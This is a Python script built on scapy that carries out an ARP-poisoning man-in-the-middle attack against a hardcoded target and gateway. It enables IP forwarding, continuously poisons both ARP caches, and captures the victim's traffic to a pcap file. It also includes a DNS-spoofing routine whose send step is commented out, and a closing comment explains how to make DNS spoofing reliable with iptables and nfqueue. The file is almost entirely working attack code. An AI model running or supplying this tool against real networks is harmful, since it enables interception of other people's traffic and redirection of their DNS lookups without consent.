import sys
import os
import time
import threading
from scapy.all import *


def script_path():
    '''set current path, to script path'''
    current_path = os.path.realpath(os.path.dirname(sys.argv[0]))
    os.chdir(current_path)
    return current_path
    
    
def get_mac(ip_address):
    '''get mac for specified ip_address; (use scapy getmacbyip function instead)'''
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
    for s, r in responses:
        return r[Ether].src
    return None
    
    
def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    '''restore original route'''
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
    return None
    
    
def assert_mac(mac_value, ip_value):
    '''check if mac is valid'''
    if mac_value is None:
        print("[X] failed to get mac value of address [{}]. Exiting...".format(ip_value))
        return False
    print("[*] [{}] is on [{}]".format(ip_value, mac_value))
    return True
    
    
def dns_spoof(pkt):
    '''this function is truncated for showing urls names of dns requests'''
    redirect_to = '192.168.0.94'
    if pkt.haslayer(DNSQR): # DNS question record
        try:
            print(pkt[IP].src, pkt[DNS].qd.qname)
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                          DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                          an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
            
            # uncomment for weak dns spoof attack (affected by race condition)
            #send(spoofed_pkt)
            #print('Sent:', spoofed_pkt.summary())
        except:
            pass
            
    return None
    
    
class PoisonAttack():
    '''arp poision attack object'''
    def __init__(self, gateway_ip, gateway_mac, target_ip, target_mac):
        self.poison_target_packet = ARP()
        self.poison_target_packet.op = 2
        self.poison_target_packet.psrc = gateway_ip
        self.poison_target_packet.pdst = target_ip
        self.poison_target_packet.hwdst= target_mac
        
        self.poison_gateway_packet = ARP()
        self.poison_gateway_packet.op = 2
        self.poison_gateway_packet.psrc = target_ip
        self.poison_gateway_packet.pdst = gateway_ip
        self.poison_gateway_packet.hwdst= gateway_mac
        
        self.close_thread = False
        return None
        
    def poison_target(self):
        '''arp poison attack loop'''
        while not self.close_thread:
            try:
                send(self.poison_target_packet)
                send(self.poison_gateway_packet)
                time.sleep(0.5)
                
            except:
                print('[X] failed to provide arp poision attack')
                time.sleep(0.1)
                
        return None
        
        
if __name__ == "__main__":
    script_path()
    
    # ********* configuration & setup *********
    interface = "wlan0"
    conf.iface = interface
    conf.verb = 0               # verbose setup; no messages from scapy
    packet_count = 10000 
    print("[*] interface configuration: {}".format(interface))
    
    
    # ********* get ip's and mac's *********
    mitm_attack = True          # True/False - switch between mitm & dns sniff
    gateway_ip = '192.168.0.1'
    target_ip = '192.168.0.99'
    target_mac, gateway_mac = get_mac(target_ip), get_mac(gateway_ip)
    
    if not all((assert_mac(gateway_mac, gateway_ip), assert_mac(target_mac, target_ip))):
        sys.exit(-1)
        
        
    # ********* ip forwarding ON *********
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    print('[*] ip forwading turn ON')
    time.sleep(0.5)
    
    
    # ********* start poisoning attack *********
    poison_object = PoisonAttack(gateway_ip, gateway_mac, target_ip, target_mac)
    poison_thread = threading.Thread(target=poison_object.poison_target)
    poison_thread.start()
    
    
    # ********* sniffing *********
    try:
        if mitm_attack:
            print("[*] starting sniffer for [{}] packets".format(packet_count))
            print("[*] press ctrl+C, to break sniffing")
            bpf_filter = "ip host {}".format(target_ip)
            #bpf_filter += " and (protocol DNS or protocol HTTP or protocol OCSP)"
            #bpf_filter += " and (tcp port 53 or tcp port 80)"
            packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
            print('[*] [{}] packets captured'.format(packet_count))
            
            # storing packets to file
            now_time = time.strftime('%H%M%S')
            now_date = time.strftime('%Y%m%d')
            file = '{}_{}_{}.pcap'.format(target_mac.replace(':', ''), now_date, now_time)
            wrpcap(file, packets)
            print('[*] file created: {}'.format(file))
            
        else:
            bpf_filter = "ip host {} and udp port 53".format(target_ip)
            sniff(filter=bpf_filter, iface=interface, prn=dns_spoof)
            
    except KeyboardInterrupt:
        print('[*] broken by user')
        
    finally:
        poison_object.close_thread = True
        poison_thread.join()
        print('[*] poison_thread closed & joined')
        
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        print("[*] original routing restored")
        
'''
info:
    -remember about ip forwarding. On linux, provide it with the following command:
        echo 1 > /proc/sys/net/ipv4/ip_forward
       
about blocking packets:
    https://www.cs.dartmouth.edu/~sergey/netreads/local/reliable-dns-spoofing-with-python-scapy-nfqueue.html
    tldr:
        Scapy has no means to block packets
    The above is the kind of example you’ll find in nearly every result from a Google search of dns spoofing and Scapy. In both of these examples the original DNS request packet is still being sent along with the modified packet meaning it is an unreliable way to spoof DNS. It’s a race condition with the router to supply the client with a DNS response packet. Whichever packet makes it to the client first, be it the router’s legit response or our spoofed response, will be cached on the victim’s browser and be used for the actual domain to IP lookup. Scapy has no means to block packets. The solution to this problem is to use iptables to drop or forward packets. Nfqueue-bindings is the Python module we will use to interact with iptables and forward or block certain packets.
    
working example of nfqueue:
    https://byt3bl33d3r.github.io/using-nfqueue-with-python-the-right-way.html
    
using nfqueue:
    https://gist.github.com/eXenon/85a3eab09fefbb3bee5d
    
'''
